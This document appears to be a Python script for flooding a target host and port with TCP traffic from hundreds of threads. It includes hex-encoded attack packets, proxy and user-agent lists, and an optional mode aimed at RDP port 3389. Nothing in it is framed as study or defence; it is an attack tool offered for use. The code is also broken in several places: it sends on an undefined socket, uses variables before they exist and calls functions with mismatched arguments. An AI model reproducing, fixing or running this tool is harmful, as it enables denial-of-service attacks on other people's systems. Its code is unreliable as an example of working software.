import threading, random, sys, struct
import os, socket, codecs, time, argparse
proxys = open('proxy.txt').readlines()
bot1 = open('SOCKS4.txt').readlines()
bot2 = open('SOCKS5.txt').readlines()
bot3 = open('ua.txt').readlines()
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host or ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-t", "--times", type=int, default=1000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=450, help="Threads")
ap.add_argument("-c", "--choice", type=str, default="n", help="With attack rdp (y/n)")
args = vars(ap.parse_args())
ip = args['ip']
port = args['port']
times = args['times']
th = args['times']
choice = args['choice']
host = socket.gethostbyname(ip)
def randomip():
    randip1 = random.randint(3,255)
    randip2 = random.randint(3,255)
    randip3 = random.randint(3,255)
    randip4 = random.randint(3,255)
    randip5 = random.randint(3,255)
 
  
    randip.append(randip1)
    randip.append(randip2)
    randip.append(randip3)
    randip.append(randip4)
    randip.append(randip5) 
  

    randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
    return(randip)
#socket/sock 
def start(host, port, times):
    Attack = [

        codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e63', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e69', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e72', 'hex_codec'),

        codecs.decode('081e62da', 'hex_codec'),

        codecs.decode('081e77da', 'hex_codec'),

        codecs.decode('081e4dda', 'hex_codec'),

        codecs.decode('021efd40', 'hex_codec'),

        codecs.decode('081e7eda', 'hex_codec')]
        
    timeout = time.time() + float(times)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          
    while time.time() < timeout:
        packets = random._urandom(1021)
        packets = random._urandom(5021)
        pack = random._urandom(666)
        msg = Attack[random.randrange(0,3)]
        s.connect((host, port))
        s.send(host, port)
        s.send(host, port)
        s.send(host, port)
        if int(port) == 443:
            sock.send(Attack[5],(host, int(port)))
        elif int(port) == 22:
            sock.send(Attack[4],(host, int(port)))
        elif int(port) == 80:
            sock.send(Attack[6],(host, int(port)))

def randsender(host, port, times):
    timeout = time.time() + float(times)
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
    punch = random._urandom(int(1024))
    while time.time() < timeout:
          s.connect((host, port))
          s.send(host, port)
          s.send(host, port)
          s.send(host, port)
def stdsender(host, times):
    timeout = time.time() + float(times)
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
    port = '3389'
    while time.time() < timeout:
          s.connect((host, port))
          s.send(host, port)
          s.send(host, port)
          s.send(host, port)

for y in range(th):
    if choice == 'y':
       threading.Thread(target=start, args=(host,port,times)).start()
       threading.Thread(target=randsender,args=(host,port,times)).start()
       threading.Thread(target=stdsender,args=(host,port,times)).start()
    else:
       threading.Thread(target=start,args=(host,port,times)).start()
       threading.Thread(target=randsender,args=(host,port,times)).start()
